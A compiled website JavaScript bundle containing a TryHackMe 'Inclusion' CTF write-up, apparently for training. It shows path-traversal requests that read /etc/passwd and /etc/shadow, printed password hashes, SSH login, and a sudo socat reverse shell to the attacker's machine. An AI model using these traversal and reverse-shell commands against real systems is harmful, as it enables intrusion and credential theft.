"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[866],{3905:(n,e,t)=>{t.d(e,{Zo:()=>u,kt:()=>f});var o=t(67294);function s(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}function r(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(n);e&&(o=o.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,o)}return t}function a(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?r(Object(t),!0).forEach((function(e){s(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):r(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}function i(n,e){if(null==n)return{};var t,o,s=function(n,e){if(null==n)return{};var t,o,s={},r=Object.keys(n);for(o=0;o<r.length;o++)t=r[o],e.indexOf(t)>=0||(s[t]=n[t]);return s}(n,e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);for(o=0;o<r.length;o++)t=r[o],e.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(n,t)&&(s[t]=n[t])}return s}var l=o.createContext({}),c=function(n){var e=o.useContext(l),t=e;return n&&(t="function"==typeof n?n(e):a(a({},e),n)),t},u=function(n){var e=c(n.components);return o.createElement(l.Provider,{value:e},n.children)},p="mdxType",m={inlineCode:"code",wrapper:function(n){var e=n.children;return o.createElement(o.Fragment,{},e)}},d=o.forwardRef((function(n,e){var t=n.components,s=n.mdxType,r=n.originalType,l=n.parentName,u=i(n,["components","mdxType","originalType","parentName"]),p=c(t),d=s,f=p["".concat(l,".").concat(d)]||p[d]||m[d]||r;return t?o.createElement(f,a(a({ref:e},u),{},{components:t})):o.createElement(f,a({ref:e},u))}));function f(n,e){var t=arguments,s=e&&e.mdxType;if("string"==typeof n||s){var r=t.length,a=new Array(r);a[0]=d;var i={};for(var l in e)hasOwnProperty.call(e,l)&&(i[l]=e[l]);i.originalType=n,i[p]="string"==typeof n?n:s,a[1]=i;for(var c=2;c<r;c++)a[c]=t[c];return o.createElement.apply(null,a)}return o.createElement.apply(null,t)}d.displayName="MDXCreateElement"},14665:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>l,contentTitle:()=>a,default:()=>m,frontMatter:()=>r,metadata:()=>i,toc:()=>c});var o=t(87462),s=(t(67294),t(3905));const r={},a="Inclusion",i={unversionedId:"Tryhackme/Inclusion/inclusion",id:"Tryhackme/Inclusion/inclusion",title:"Inclusion",description:"A beginner level LFI challenge",source:"@site/writeups/Tryhackme/Inclusion/inclusion.md",sourceDirName:"Tryhackme/Inclusion",slug:"/Tryhackme/Inclusion/",permalink:"/writeups/Tryhackme/Inclusion/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Ignite",permalink:"/writeups/Tryhackme/Ignite/"},next:{title:"Inoculation",permalink:"/writeups/Tryhackme/Inoculation/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Deploy",id:"task-1-deploy",level:2},{value:"Task 2 Root It",id:"task-2-root-it",level:2}],u={toc:c},p="wrapper";function m(n){let{components:e,...t}=n;return(0,s.kt)(p,(0,o.Z)({},u,t,{components:e,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"inclusion"},"Inclusion"),(0,s.kt)("p",null,"A beginner level LFI challenge"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/inclusion"},"Inclusion")),(0,s.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,s.kt)("li",{parentName:"ul"},"Directory Traversal"),(0,s.kt)("li",{parentName:"ul"},"Brute Forcing Hash"),(0,s.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"task-1-deploy"},"Task 1 Deploy"),(0,s.kt)("p",null,"This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability.\nIf you have any kind of feedback please reach out to me on twitter at ",(0,s.kt)("a",{parentName:"p",href:"https://twitter.com/0xmzfr"},"0xmzfr")),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"Deploy the machine and start enumerating")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,s.kt)("h2",{id:"task-2-root-it"},"Task 2 Root It"),(0,s.kt)("p",null,"If you've deployed the VM then try to find the LFI parameters and get the user and root flag."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Inclusion$ sudo nmap -A -Pn -sS -sC -sV -O 10.10.174.186\n[sudo] password for kali:\nSorry, try again.\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 09:22 CEST\nNmap scan report for 10.10.174.186\nHost is up (0.038s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)\n|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)\n|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)\n80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)\n|_http-server-header: Werkzeug/0.16.0 Python/3.6.9\n|_http-title: My blog\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=32945%PV=Y%DS=2%DC=T%G=Y%TM=5F86A7\nOS:43%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 587/tcp)\nHOP RTT      ADDRESS\n1   36.47 ms 10.8.0.1\n2   36.65 ms 10.10.174.186\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.24 seconds\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Inclusion$ curl -s http://10.10.174.186/article?name=../../../../etc/passwd | html2text\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:\nx:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/\nusr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/\nvar/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/\nnologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/\nvar/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:\n/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System\n(admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/\nnonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network\nManagement,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:\nsystemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/\nhome/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/\nnologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/\nlib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:\n107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/\nlib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/\nfalse falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash\n#falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:\nx:111:116:MySQL Server,,,:/nonexistent:/bin/false\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Inclusion$ curl -s http://10.10.174.186/article?name=../../../../etc/shadow | html2text\nroot:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/\netwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7::: daemon:*:17647:0:\n99999:7::: bin:*:17647:0:99999:7::: sys:*:17647:0:99999:7::: sync:*:17647:0:\n99999:7::: games:*:17647:0:99999:7::: man:*:17647:0:99999:7::: lp:*:17647:0:\n99999:7::: mail:*:17647:0:99999:7::: news:*:17647:0:99999:7::: uucp:*:17647:0:\n99999:7::: proxy:*:17647:0:99999:7::: www-data:*:17647:0:99999:7::: backup:*:\n17647:0:99999:7::: list:*:17647:0:99999:7::: irc:*:17647:0:99999:7::: gnats:*:\n17647:0:99999:7::: nobody:*:17647:0:99999:7::: systemd-network:*:17647:0:99999:\n7::: systemd-resolve:*:17647:0:99999:7::: syslog:*:17647:0:99999:7:::\nmessagebus:*:17647:0:99999:7::: _apt:*:17647:0:99999:7::: lxd:*:18281:0:99999:\n7::: uuidd:*:18281:0:99999:7::: dnsmasq:*:18281:0:99999:7::: landscape:*:18281:\n0:99999:7::: pollinate:*:18281:0:99999:7::: falconfeast:\n$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:\n18281:0:99999:7::: sshd:*:18281:0:99999:7::: mysql:!:18281:0:99999:7:::\n")),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"user flag")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Inclusion$ ssh falconfeast@10.10.174.186The authenticity of host '10.10.174.186 (10.10.174.186)' can't be established.\nECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.174.186' (ECDSA) to the list of known hosts.\nfalconfeast@10.10.174.186's password:\nWelcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Wed Oct 14 13:00:16 IST 2020\n\n  System load:  0.01              Processes:           85\n  Usage of /:   35.0% of 9.78GB   Users logged in:     0\n  Memory usage: 32%               IP address for eth0: 10.10.174.186\n  Swap usage:   0%\n\n\n * Canonical Livepatch is available for installation.\n   - Reduce system reboots and improve kernel security. Activate at:\n     https://ubuntu.com/livepatch\n\n3 packages can be updated.\n3 updates are security updates.\n\n\nLast login: Thu Jan 23 18:41:39 2020 from 192.168.1.107\nfalconfeast@inclusion:~$ ls\narticles  user.txt\nfalconfeast@inclusion:~$ cat user.txt\n60989655118397345799\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"60989655118397345799")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"root flag")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"falconfeast@inclusion:~$ sudo -l\nMatching Defaults entries for falconfeast on inclusion:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser falconfeast may run the following commands on inclusion:\n    (root) NOPASSWD: /usr/bin/socat\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/socat/#sudo"},"https://gtfobins.github.io/gtfobins/socat/#sudo")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"falconfeast@inclusion:~$ sudo socat tcp-connect:10.8.106.222:9001 exec:sh,pty,stderr,setsid,sigint,sane\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Inclusion$ nc -nlvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.174.186] 47892\nsh: 0: can't access tty; job control turned off\n# whoami\nwhoami\nroot\n# cd /root\ncd /root\n# ls\nls\nroot.txt\n# cat root.txt\ncat root.txt\n42964104845495153909\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"42964104845495153909")))}m.isMDXComponent=!0}}]);